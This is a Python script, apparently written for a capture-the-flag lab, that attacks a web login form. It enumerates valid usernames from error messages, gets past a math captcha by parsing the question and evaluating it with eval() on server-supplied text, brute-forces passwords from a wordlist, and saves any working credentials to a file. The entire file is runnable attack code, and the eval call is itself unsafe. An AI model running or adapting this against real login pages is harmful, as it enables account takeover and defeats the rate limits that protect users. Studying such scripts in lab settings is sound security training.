import requests, os
from bs4 import BeautifulSoup

# Function used to bypass the captcha
def bypass_captcha(response):
	index_of_captcha_tag = response.find("Captcha enabled")
	# Don't forget to add 5 to the length, so that we only extract the actual operation
	start_of_captcha = response.find("<br>",index_of_captcha_tag) + 5
	end_of_captcha = response.find("?", index_of_captcha_tag)
	captcha_string = response[start_of_captcha:end_of_captcha]
	captcha_string = captcha_string.replace(" ","")
	# We have the operation - we now need to break it down
	operator = ""
	if captcha_string.find("+") > 0:
		operator = "+"
	elif captcha_string.find("-") > 0:
		operator = "-"
	elif captcha_string.find("*") > 0:
		operator = "*"
	elif captcha_string.find("/") > 0:
		operator = "/"
	first_operand = captcha_string[:captcha_string.find(operator)]
	second_operand = captcha_string[captcha_string.find(operator)+1:-1]
	# We'll use the eval() function to turn the string into a Python expression
	return eval(first_operand + operator + second_operand)


# Change this with the URL of your web app
url = "http://10.10.173.91/login"
existing_users = "existing_users"
non_existing_users = "non_existing_users"
invalid_password_file = "invalid_password"
credentials = "credentials"

# Open the usernames and passwords files
with open('usernames.txt') as f:
	usernames = f.readlines()

with open('passwords.txt') as f:
	passwords = f.readlines()

# Remove the \n of all strings
for i in range(len(usernames)-1):
	usernames[i] = usernames[i][:-1]

for i in range(len(passwords)-1):
	passwords[i] = passwords[i][:-1]

# Load the files containing usernames we've already checked
if os.path.exists(existing_users):
	with open(existing_users,'r') as f:
		existing_users = f.read().split(",")
else:
	existing_users = ""

if os.path.exists(non_existing_users):
	with open(non_existing_users,'r') as f:
		non_existing_users = f.read().split(",")
else:
	non_existing_users = ""

for username in usernames:
	# If our username has already been enumerated, we'll skip it
	if username in existing_users:
		continue
	elif username in non_existing_users:
		continue

	print("Enumeration starting for username " + username)

	# We will first enumerate usernames; we use a bogus password for now.
	# The goal is to get an error message that would tell us that the username is valid.
	form_data = {
		"username": username,
		"password": "bogus"
	}

	# Send a POST request to the URL
	response = requests.post(url,data=form_data)

	# We found a captcha - let's extract the operation
	if "Too many bad login attempts!" in response.text:
		form_data["captcha"] = bypass_captcha(response.text)
		response = requests.post(url,data=form_data)

	if "does not exist" in response.text:
		# We'll save the username in a file, so that we can re-use it in case our script crashes
		with open('non_existing_users', 'a') as f:
			f.write(username+",")
	else:
		with open('existing_users','a') as f:
			f.write(username+",")
			existing_users.append(username)

print("End of the user enumeration - starting the bruteforce")

# We looped through the whole list of users and found our valid users
# Let's now try all the passwords on these users
# We first check if we have a file of invalid password from a previous run of the script
if os.path.exists(invalid_password_file):
	with open(invalid_password_file,'r') as f:
		invalid_passwords = f.read().split(",") 
else:
	invalid_passwords = []

# For each valid user, we'll now try every single password
for user in existing_users:
	for password in passwords:
		if password in invalid_passwords:
			continue
		print("Trying to login using username: " + user + " || password: " + password)
		form_data = {
			"username": user,
			"password": password
		}
		response = requests.post(url,data=form_data)
		# Again, if we are prompted with a captcha, we need to bypass it
		if "Too many bad login attempts!" in response.text:
			form_data["captcha"] = bypass_captcha(response.text)
			response = requests.post(url,data=form_data)

		# If the password isn't correct, we get an error message - let's save this password in a separate file for future use
		if "nvalid password" in response.text:
			with open(invalid_password_file,'a') as f:
				f.write(password+",")
		else:
			print("Found valid credentials!")
			print("Username: "+user)
			print("Password: "+password)
			with open(credentials,'a') as f:
				f.write(user+'\n'+password)
			break
